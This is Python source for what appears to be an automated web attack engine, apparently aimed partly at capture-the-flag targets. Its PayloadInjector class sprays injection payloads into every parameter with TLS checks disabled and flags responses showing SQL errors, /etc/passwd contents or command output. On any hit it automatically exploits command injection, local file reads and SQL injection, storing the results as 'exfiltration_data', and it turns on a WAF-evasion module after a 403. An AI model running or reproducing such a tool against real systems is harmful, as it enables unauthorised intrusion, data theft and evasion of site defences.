"""
PAYLOAD INJECTOR - Active payload injection engine.
Injects payloads into every discovered parameter and analyzes responses.
"""
import asyncio
import time
from typing import Dict, List, Optional, Tuple, Callable
from urllib.parse import urlparse, urlencode, parse_qs
import httpx

from engine.attack.payloads import PayloadLibrary
from engine.attack.flag_hunter import FlagHunter
from engine.attack.ghost_operator import GhostOperator
from engine.attack.exploiter import Exploiter
from engine.logging.logger import get_logger


class PayloadInjector:
    """
    Active payload injection engine.
    Injects payloads into parameters and analyzes responses for vulnerabilities.
    """
    
    def __init__(self, session: Optional[httpx.AsyncClient] = None, attack_mode: str = "aggressive"):
        self.session = session
        self.attack_mode = attack_mode
        self.payload_lib = PayloadLibrary()
        self.logger = get_logger()
        self.findings: List[Dict] = []
        self.baselines: Dict[str, Dict] = {}  # url -> baseline response
        
        # Advanced modules
        self.flag_hunter = FlagHunter(session)
        self.ghost_operator = GhostOperator(session)
        self.exploiter = Exploiter(session)  # Actual exploitation engine
        
        # Aggressive mode settings
        self.aggressive = (attack_mode == "aggressive")
        if self.aggressive:
            self.logger.info("[ATTACK] AGGRESSIVE MODE: Maximum payload coverage enabled")
    
    def set_progress_callback(self, callback):
        """Set progress callback for real-time updates."""
        self.exploiter.progress_callback = callback
    
    async def inject_all(self, endpoints: List[str], parameters: Dict[str, List[str]]) -> List[Dict]:
        """
        Inject payloads into all discovered endpoints and parameters.
        
        Args:
            endpoints: List of discovered endpoints
            parameters: Dictionary mapping endpoints to parameter lists
            
        Returns:
            List of vulnerability findings
        """
        self.logger.info(f"[ATTACK] Starting payload injection on {len(endpoints)} endpoints")
        
        # Establish baselines first
        await self._establish_baselines(endpoints)
        
        # Inject into each endpoint/parameter combination
        tasks = []
        for endpoint in endpoints:
            params = parameters.get(endpoint, [])
            if params:
                for param in params:
                    tasks.append(self._inject_parameter(endpoint, param))
            else:
                # Test endpoint without parameters too
                tasks.append(self._inject_endpoint(endpoint))
        
        # Execute with concurrency limit (more aggressive in aggressive mode)
        concurrency = 50 if self.aggressive else 20
        self.logger.info(f"[ATTACK] Using {concurrency} concurrent injections")
        
        for i in range(0, len(tasks), concurrency):
            batch = tasks[i:i+concurrency]
            results = await asyncio.gather(*batch, return_exceptions=True)
            for result in results:
                if isinstance(result, dict) and result.get("vulnerable"):
                    self.findings.append(result)
        
        self.logger.info(f"[ATTACK] Injection complete. Found {len(self.findings)} potential vulnerabilities")
        return self.findings
    
    async def _establish_baselines(self, endpoints: List[str]):
        """Establish baseline responses for differential analysis."""
        self.logger.info("[ATTACK] Establishing baseline responses...")
        
        for endpoint in endpoints[:100]:  # Limit baseline collection
            try:
                baseline = await self._get_baseline(endpoint)
                if baseline:
                    self.baselines[endpoint] = baseline
            except Exception as e:
                self.logger.debug(f"Failed to get baseline for {endpoint}: {e}")
    
    async def _get_baseline(self, url: str) -> Optional[Dict]:
        """Get baseline response for an endpoint."""
        try:
            if not self.session:
                async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
                    response = await client.get(url)
            else:
                response = await self.session.get(url)
            
            return {
                "status_code": response.status_code,
                "content_length": len(response.content),
                "response_time": 0,  # Will be measured during injection
                "headers": dict(response.headers),
                "body_snippet": (response.text[:500] if response.text else "")
            }
        except Exception:
            return None
    
    async def _inject_parameter(self, endpoint: str, parameter: str) -> Dict:
        """Inject payloads into a specific parameter."""
        payloads = self.payload_lib.get_all_payloads(self.attack_mode)
        
        for payload_data in payloads:
            payload = payload_data.get("payload", "")
            category = payload_data.get("category", "")
            payload_type = payload_data.get("type", "")
            
            # Inject into GET parameter
            finding = await self._inject_get_parameter(endpoint, parameter, payload, payload_data)
            if finding and finding.get("vulnerable"):
                return finding
            
            # Inject into POST body
            finding = await self._inject_post_parameter(endpoint, parameter, payload, payload_data)
            if finding and finding.get("vulnerable"):
                return finding
        
        return {"vulnerable": False}
    
    async def _inject_get_parameter(self, url: str, param: str, payload: str, payload_data: Dict) -> Dict:
        """Inject payload into GET parameter."""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[param] = [payload]
            
            new_query = urlencode(params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
            
            start_time = time.time()
            if not self.session:
                async with httpx.AsyncClient(verify=False, timeout=15.0) as client:
                    response = await client.get(test_url)
            else:
                response = await self.session.get(test_url)
            response_time = time.time() - start_time
            
            # Analyze response
            return await self._analyze_response(
                url=test_url,
                parameter=param,
                payload=payload,
                payload_data=payload_data,
                response=response,
                response_time=response_time,
                method="GET"
            )
        except Exception as e:
            self.logger.debug(f"Injection failed for GET {url}?{param}={payload}: {e}")
            return {"vulnerable": False}
    
    async def _inject_post_parameter(self, url: str, param: str, payload: str, payload_data: Dict) -> Dict:
        """Inject payload into POST parameter."""
        try:
            data = {param: payload}
            
            start_time = time.time()
            if not self.session:
                async with httpx.AsyncClient(verify=False, timeout=15.0) as client:
                    response = await client.post(url, data=data)
            else:
                response = await self.session.post(url, data=data)
            response_time = time.time() - start_time
            
            # Analyze response
            return await self._analyze_response(
                url=url,
                parameter=param,
                payload=payload,
                payload_data=payload_data,
                response=response,
                response_time=response_time,
                method="POST"
            )
        except Exception as e:
            self.logger.debug(f"Injection failed for POST {url} with {param}={payload}: {e}")
            return {"vulnerable": False}
    
    async def _inject_endpoint(self, endpoint: str) -> Dict:
        """Inject payloads directly into endpoint path."""
        # Test for path traversal, LFI in the path itself
        lfi_payloads = self.payload_lib.get_payloads_by_category("lfi")
        
        for payload_data in lfi_payloads[:5]:  # Limit path injection tests
            payload = payload_data.get("payload", "")
            test_url = endpoint.rstrip('/') + '/' + payload
            
            try:
                start_time = time.time()
                if not self.session:
                    async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
                        response = await client.get(test_url)
                else:
                    response = await self.session.get(test_url)
                response_time = time.time() - start_time
                
                finding = await self._analyze_response(
                    url=test_url,
                    parameter="path",
                    payload=payload,
                    payload_data=payload_data,
                    response=response,
                    response_time=response_time,
                    method="GET"
                )
                
                if finding and finding.get("vulnerable"):
                    return finding
            except Exception:
                pass
        
        return {"vulnerable": False}
    
    async def _analyze_response(
        self,
        url: str,
        parameter: str,
        payload: str,
        payload_data: Dict,
        response: httpx.Response,
        response_time: float,
        method: str
    ) -> Dict:
        """
        Analyze response for vulnerability indicators.
        Uses differential analysis against baseline.
        """
        category = payload_data.get("category", "")
        payload_type = payload_data.get("type", "")
        confidence = payload_data.get("confidence", "low")
        
        # Get baseline
        parsed = urlparse(url)
        baseline_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        baseline = self.baselines.get(baseline_url, {})
        
        # Response differential analysis
        status_change = response.status_code != baseline.get("status_code", 200)
        length_deviation = abs(len(response.content) - baseline.get("content_length", 0))
        length_change_percent = (length_deviation / baseline.get("content_length", 1)) * 100 if baseline.get("content_length", 0) > 0 else 0
        
        # Time-based detection (for blind SQLi, command injection)
        time_anomaly = False
        if payload_type in ["time_based", "time-based"]:
            if response_time > 5.0:  # Significant delay
                time_anomaly = True
        
        # Keyword detection
        body_lower = response.text.lower() if response.text else ""
        keywords_found = []
        
        # SQL error keywords
        sql_keywords = ["sql syntax", "mysql", "postgresql", "sqlite", "ora-", "sql error", "sql exception", "warning: mysql"]
        for keyword in sql_keywords:
            if keyword in body_lower:
                keywords_found.append(keyword)
        
        # Command execution keywords
        cmd_keywords = ["uid=", "gid=", "groups=", "root:", "/bin/sh", "command not found", "sh: "]
        for keyword in cmd_keywords:
            if keyword in body_lower:
                keywords_found.append(keyword)
        
        # File disclosure keywords
        file_keywords = ["root:", "/etc/passwd", "/etc/shadow", "c:\\windows", "[boot loader]"]
        for keyword in file_keywords:
            if keyword in body_lower:
                keywords_found.append(keyword)
        
        # Payload reflection
        payload_reflected = payload in response.text or payload.lower() in body_lower
        
        # SSTI detection (check for expected output)
        ssti_detected = False
        if category == "ssti":
            expected = payload_data.get("expected")
            if expected and expected in response.text:
                ssti_detected = True
        
        # XSS detection (payload in response)
        xss_detected = False
        if category == "xss" and payload_reflected:
            # Check if payload appears unencoded
            if "<script>" in response.text or "onerror=" in response.text:
                xss_detected = True
        
        # Determine if vulnerable
        vulnerable = False
        evidence = []
        
        if status_change:
            evidence.append(f"Status code changed: {baseline.get('status_code')} -> {response.status_code}")
        
        if length_change_percent > 10:  # More than 10% change
            evidence.append(f"Response length deviation: {length_change_percent:.1f}%")
        
        if time_anomaly:
            vulnerable = True
            evidence.append(f"Time-based delay detected: {response_time:.2f}s")
            confidence = "high"
        
        if keywords_found:
            vulnerable = True
            evidence.append(f"Error keywords found: {', '.join(keywords_found)}")
            confidence = "high"
        
        if ssti_detected:
            vulnerable = True
            evidence.append(f"SSTI execution detected: expected output '{expected}' found")
            confidence = "high"
        
        if xss_detected:
            vulnerable = True
            evidence.append("XSS payload reflected unencoded")
            confidence = "high"
        
        if payload_reflected and category in ["xss", "open_redirect"]:
            vulnerable = True
            evidence.append("Payload reflected in response")
            if confidence == "low":
                confidence = "medium"
        
        # Even if not clearly vulnerable, report suspicious findings
        if length_change_percent > 5 or status_change:
            if confidence == "low":
                confidence = "medium"
        
        # Check for blocks and activate evasion if needed
        # Auto-trigger Ghost Operator on 403 Forbidden
        if response.status_code == 403:
            self.logger.warning(f"[ATTACK] 403 Forbidden detected. Activating Ghost Operator evasion.")
            self.ghost_operator.evasion_active = True
            self.ghost_operator.blocked_count = 2  # Force activation
        
        self.ghost_operator.detect_block(response)
        
        # Hunt for flags in response with vulnerability context
        try:
            if response.text:
                # Determine source based on vulnerability category
                source = 'unknown'
                if category in ['command_injection', 'rce']:
                    source = 'rce'
                elif category == 'lfi':
                    source = 'lfi'
                elif category == 'sql_injection':
                    source = 'sqli'
                elif category == 'ssti':
                    source = 'ssti'
                
                flags = await self.flag_hunter.hunt_flags(
                    response.text,
                    url,
                    context={
                        'source': source,
                        'exploitation_backed': vulnerable,
                        'category': category,
                        'parameter': parameter
                    }
                )
                if flags:
                    # Only report confirmed/high-probability flags
                    confirmed = [f for f in flags if f.get('confidence') in ['CONFIRMED', 'HIGH_PROBABILITY']]
                    if confirmed:
                        evidence.append(f"CTF flags found via {source}: {', '.join([f['flag'] for f in confirmed])}")
        except Exception as e:
            self.logger.debug(f"Flag hunting failed: {e}")
        
        # If vulnerable, ACTUALLY EXPLOIT IT (black hat behavior, white hat mindset)
        exfiltration_data = {}
        exploitation_result = {}
        
        if vulnerable:
            try:
                # Actually exploit the vulnerability
                if category == "sql_injection" or "sql" in category.lower():
                    exploitation_result = await self.exploiter.exploit_sql_injection(
                        url, parameter, payload, method
                    )
                    if exploitation_result.get("success"):
                        exfiltration_data = exploitation_result.get("data_extracted", {})
                
                elif category == "command_injection" or category == "rce" or "command" in category.lower():
                    # Actually execute commands
                    exploitation_result = await self.exploiter.exploit_command_injection(
                        url, parameter, payload, method
                    )
                    if exploitation_result.get("success"):
                        exfiltration_data = {
                            "commands_executed": exploitation_result.get("commands_executed", []),
                            "output": exploitation_result.get("output", {})
                        }
                    # Also use flag hunter for additional data
                    try:
                        flag_data = await self.flag_hunter.execute_rce_commands(url, parameter, payload)
                        exfiltration_data.update(flag_data)
                    except Exception:
                        pass
                
                elif category == "lfi" or "lfi" in category.lower():
                    # Actually read files
                    exploitation_result = await self.exploiter.exploit_lfi(url, parameter, payload)
                    if exploitation_result.get("success"):
                        exfiltration_data = {
                            "files_read": exploitation_result.get("files_read", []),
                            "file_contents": exploitation_result.get("file_contents", {})
                        }
                    # Also use flag hunter
                    try:
                        flag_data = await self.flag_hunter.lfi_config_crawl(url, parameter, payload)
                        exfiltration_data.update(flag_data)
                    except Exception:
                        pass
                
                elif category == "xss":
                    # Verify XSS execution
                    exploitation_result = await self.exploiter.exploit_xss(url, parameter, payload, method)
                    if exploitation_result.get("success"):
                        exfiltration_data = {
                            "payload_reflected": exploitation_result.get("payload_reflected", False),
                            "execution_verified": exploitation_result.get("execution_verified", False)
                        }
                
            except Exception as e:
                error_msg = str(e)
                self.logger.warning(f"[EXPLOIT] Exploitation failed for {category}: {error_msg}")
                # Store failure reason
                if not exploitation_result:
                    exploitation_result = {
                        "success": False,
                        "error": error_msg,
                        "reason": f"Exception during exploitation: {error_msg}"
                    }
        
        if vulnerable or len(evidence) > 0:
            finding = {
                "vulnerable": vulnerable,
                "endpoint": url,
                "parameter": parameter,
                "method": method,
                "payload": payload,
                "category": category,
                "type": payload_type,
                "confidence": confidence,
                "status_code": response.status_code,
                "response_time": response_time,
                "evidence": evidence,
                "response_snippet": (response.text[:200] if response.text else ""),
                "baseline_comparison": {
                    "status_code": baseline.get("status_code"),
                    "content_length": baseline.get("content_length"),
                    "length_deviation": length_deviation,
                    "length_change_percent": length_change_percent
                }
            }
            
            # Add exploitation and exfiltration data
            if exfiltration_data:
                finding["exfiltration_data"] = exfiltration_data
            
            if exploitation_result:
                finding["exploitation_result"] = exploitation_result
                finding["exploited"] = exploitation_result.get("success", False)
                
                # Add failure reason if exploitation failed
                if not exploitation_result.get("success"):
                    finding["exploitation_failure"] = {
                        "reason": exploitation_result.get("reason", exploitation_result.get("error", "Unknown error")),
                        "details": exploitation_result
                    }
            
            if exfiltration_data:
                finding["exfiltration"] = exfiltration_data
            
            return finding
        
        return {"vulnerable": False}
